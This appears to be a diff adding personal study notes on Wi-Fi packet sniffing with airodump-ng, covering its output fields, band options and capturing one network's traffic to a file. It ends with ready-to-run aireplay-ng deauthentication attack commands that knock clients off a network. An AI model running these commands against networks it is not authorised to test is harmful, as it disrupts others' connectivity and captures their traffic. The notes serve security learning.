@@ -1,0 +1,40 @@
+## Packet sniffing using AIRODUMP-NG: 
+          Uses: > part of aircrack-ng suit.
+                > Airodump-ng is a packet sniffer
+                > Used to capture all the packets in the range.
+                > Display detailed info about network around us.
+                > display connected clients. etc
+                
+## Using airodump-ng to see the wireless conections nearby: > airodump-ng wlan0 (the name of the wifi adapter that is in monitor mode)
+
+BSSID : shows the mac address of the network.
+PWR : signal strength.
+Beacons : sent by network in order to broadcast its existence.
+#DATA : These are the data packets.
+#/s : this section tells us the number of data packets we capture in the past 10 seconds
+CH: tells us on which channel our network is working.
+MB : max speed supported by the n/w
+ENC : tells us the encryption level.
+CHIPHER : is the chipher used by the n/w
+AUTH : The authentication used on the network.
+ESSID : is what the name of the network.
+
+- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -  - - - - - - - - - - - - - - - - -  
+
+## Wifi bands: 
+Sniff and discover wifi with 5g bandwidth: > airodump-ng --band a wlan0
+Sniff and discover wifi for 2.4 and 5 g bandwidth at the same time: > airodump-ng --band abg wlan0
+Sniff data from a particular network: > airodump-ng --bssid "paste te bssid" --channel "its channel number" --write "file name" wlan0 
+( we use --write here to save the data in a file ) 
+
+- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -  - - - - - - - - - - - - - - - - -  
+
+Checking the connected networks: > airodump-ng -d bssid -c channel wlan0
+
+- - - - - - - - - - - - - - - - - - - - - - - - -  - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -
+
+Deauthentication attack: 
+command is > aireplay-ng --deauth 10000000 -a bssid -c station wlan0 
+           > aireplay-ng -0 0 -a bssid -c station  wlan0  
+           
+EXPLAINATION : The command is instructing aireplay-ng to perform a deauthentication attack by sending a massive number of deauthentication frames (10 million) to a specific client station (-c station) associated with a particular access point (-a bssid) using the specified network interface (wlan0). The goal of such an attack is to disrupt the target client's ability to communicate with the access point, essentially causing them to disconnect from the network temporarily.
